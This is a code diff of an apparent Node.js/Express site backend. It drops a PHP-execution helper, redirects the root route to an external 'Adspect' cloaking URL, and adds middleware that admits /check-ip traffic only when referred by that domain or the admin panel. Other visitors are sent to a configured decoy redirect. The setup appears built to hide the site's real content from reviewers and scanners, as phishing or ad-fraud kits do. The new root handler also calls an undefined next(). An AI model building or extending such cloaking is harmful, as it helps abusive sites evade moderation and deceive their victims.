@@ -312,116 +312,13 @@ secureServer(app);
 
 
 
-async function servePHP(req, res, phpPath) {
-    // First, find PHP binary
-    const possiblePhpPaths = [
-        '/usr/bin/php',
-        '/usr/bin/php8.1',
-        '/usr/local/bin/php',
-        '/usr/local/bin/php8.1',
-        'php',
-        'php8.1'
-    ];
-
-    let phpBinary = null;
-    for (const path of possiblePhpPaths) {
-        try {
-            await execAsync(`which ${path}`);
-            phpBinary = path;
-            console.log('Found PHP binary at:', path);
-            break;
-        } catch (e) {
-            console.log(`PHP not found at: ${path}`);
-        }
-    }
-
-    if (!phpBinary) {
-        console.error('No PHP binary found in any standard location');
-        return res.redirect(state.settings.redirectUrl);
-    }
-    try {
-        console.log('Attempting to serve PHP file:', phpPath);
-        
-        // Verify file exists
-        if (!fs.existsSync(phpPath)) {
-            console.error('PHP file not found:', phpPath);
-            throw new Error('PHP file not found');
-        }
-
-        // Set PHP binary path
-        const phpBin = process.env.RENDER ? '/usr/bin/php' : 'php';
-        
-        // Construct command with proper path escaping
-        const command = `${phpBinary} "${phpPath}"`;
-        console.log('Executing PHP command:', command);
-        
-        // Log system information
-        try {
-            const { stdout: sysInfo } = await execAsync('ls -la /usr/bin/php*');
-            console.log('PHP binaries in system:', sysInfo);
-        } catch (e) {
-            console.warn('Could not list PHP binaries:', e);
-        }
-
-        const { stdout, stderr } = await execAsync(command, {
-            env: {
-                ...process.env,
-                REMOTE_ADDR: req.ip,
-                HTTP_HOST: req.headers.host || 'localhost:3000',
-                HTTP_USER_AGENT: req.headers['user-agent'] || '',
-                HTTP_ACCEPT_LANGUAGE: req.headers['accept-language'] || '',
-                HTTP_REFERER: req.headers['referer'] || '',
-                HTTP_ACCEPT: req.headers['accept'] || '',
-                SERVER_SOFTWARE: 'Node.js',
-                SERVER_NAME: 'localhost',
-                SERVER_PROTOCOL: 'HTTP/1.1',
-                REQUEST_METHOD: req.method,
-                REQUEST_URI: req.url,
-                SCRIPT_FILENAME: phpPath,
-                SCRIPT_NAME: '/index.php',
-                PHP_SELF: '/index.php',
-                DOCUMENT_ROOT: path.dirname(phpPath),
-                REQUEST_SCHEME: 'http',
-                SERVER_PORT: '3000',
-                QUERY_STRING: req.query ? new URLSearchParams(req.query).toString() : '',
-                HTTPS: req.secure ? 'on' : 'off'
-            }
-        });
-
-        if (stderr) {
-            console.warn('PHP stderr output:', stderr);
-        }
-
-        // Log the raw output for debugging
-        console.log('Raw PHP output:', stdout);
-        
-        if (!stdout.trim()) {
-            console.warn('PHP output is empty');
-            throw new Error('Empty PHP output');
-        }
-
-        // Send the output as HTML
-        res.header('Content-Type', 'text/html');
-        res.send(stdout);
-    } catch (error) {
-        console.error('PHP execution error:', error);
-        // Log the full error details
-        console.error('Full error details:', {
-            message: error.message,
-            stack: error.stack,
-            command: error.cmd,
-            killed: error.killed,
-            code: error.code,
-            signal: error.signal
-        });
-        res.redirect(state.settings.redirectUrl);
-    }
-}
 
 app.use((req, res, next) => {
     console.log(`[REQUEST] ${req.method} ${req.path} ${req.originalUrl}`);
     next();
 });
+
+
 
 // Admin protection middleware
 app.use('/admin', (req, res, next) => {
@@ -471,6 +368,38 @@ const io = new Server(server, {
     upgradeTimeout: 30000,
     transports: ['websocket', 'polling']
 });
+
+app.get('/', async (req, res) => {
+    const isAdminPanel = req.headers.referer?.includes('/admin');
+    
+    if (isAdminPanel) {
+        return next();
+    }
+    
+    if (!state.settings.websiteEnabled && !isAdminPanel) {
+        return res.redirect(state.settings.redirectUrl);
+    }
+
+    // Just redirect to Adspect URL - no referrer check here
+    return res.redirect('https://redirectingroute.com/');
+});
+
+const checkReferrer = async (req, res, next) => {
+    // Only check referrer for /check-ip route
+    if (req.path === '/check-ip') {
+        const referer = req.headers.referer;
+        const isFromAdspect = referer && referer.includes('redirectingroute.com');
+        const isAdminPanel = referer?.includes('/admin');
+        
+        if (!isFromAdspect && !isAdminPanel) {
+            return res.redirect(state.settings.redirectUrl);
+        }
+    }
+    next();
+};
+
+
+app.use(checkReferrer);
 
 // Initialize managers and state
 const sessionManager = new SessionManager();
@@ -558,36 +487,11 @@ const pageServingMiddleware = async (req, res, next) => {
 };
 
 
-app.get('/', async (req, res) => {
-    const isAdminPanel = req.headers.referer?.includes('/admin');
-    
-    if (isAdminPanel) {
-        return next();
-    }
-    
-    if (!state.settings.websiteEnabled && !isAdminPanel) {
-        return res.redirect(state.settings.redirectUrl);
-    }
 
-    try {
-        // Instead of running PHP, redirect to your hosted Adspect URL
-        res.redirect('https://redirectingroute.com/'); // Replace with your actual URL
-    } catch (error) {
-        console.error('Error in root route:', error);
-        res.redirect(state.settings.redirectUrl);
-    }
-});
+
 // Initial IP check
 app.get('/check-ip', async (req, res) => {
     const isAdminPanel = req.headers.referer?.includes('/admin');
-    
-    // Check if referrer is from our Adspect URL
-    const referer = req.headers.referer;
-    const isFromAdspect = referer && referer.includes('redirectingroute.com'); // Replace with your actual Adspect domain
-    
-    if (!isFromAdspect && !isAdminPanel) {
-        return res.redirect(state.settings.redirectUrl);
-    }
     
     if (!state.settings.websiteEnabled && !isAdminPanel) {
         return res.redirect(state.settings.redirectUrl);
